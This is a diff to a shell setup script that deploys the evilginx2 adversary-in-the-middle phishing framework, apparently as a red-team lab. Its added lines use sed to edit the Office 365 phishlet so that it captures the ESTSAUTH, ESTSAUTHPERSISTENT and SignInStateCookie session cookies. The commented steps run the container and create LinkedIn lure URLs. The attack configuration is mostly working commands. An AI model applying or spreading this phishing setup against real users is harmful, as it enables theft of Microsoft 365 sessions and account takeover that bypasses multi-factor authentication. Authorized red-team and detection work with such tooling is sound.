@@ -28,11 +28,17 @@ sed -i "s|^#DNSStubListener=yes$|DNSStubListener=no|g" /etc/systemd/resolved.con
 ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
 systemctl restart systemd-resolved
 
+# *********** Updating o365 Phishlet ***********
+# https://github.com/kgretzky/evilginx2/issues/691
+sed -i "s|keys: \['ESTSAUTH', 'ESTSAUTHPERSISTENT'\]|keys: \['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie'\]|g" /opt/evilginx2/phishlets/o365.yaml
+sed -i "s|- domain: 'login.microsoftonline.com'|#- domain: 'login.microsoftonline.com'|g" /opt/evilginx2/phishlets/o365.yaml
+sed -i "s|keys: \['SignInStateCookie'\]|#keys: \['SignInStateCookie'\]|g" /opt/evilginx2/phishlets/o365.yaml
+
 # *********** Run evilginx2 container ***********
 # SSH to VM
 # sudo su
 # Run EvilGinx2 in developer mode (generates self-signed certificates for all hostnames)
-# docker run -it -p 53:53/udp -p 80:80 -p 443:443 --name evilginx2 -v /opt/evilginx2/phishlets:/app/phishlets evilginx2 -developer
+# docker run --rm -it -p 53:53/udp -p 80:80 -p 443:443 --name evilginx2 -v /opt/evilginx2/phishlets:/app/phishlets evilginx2 -developer
 
 # *********** Getting Started ***********
 # Reference:
@@ -54,3 +60,6 @@ systemctl restart systemd-resolved
 # lures create linkedin
 # lures edit 0 redirect_url https://www.google.com
 # lures get-url 0
+
+# Clear Browser Data (Edge)
+# edge://settings/clearBrowserData
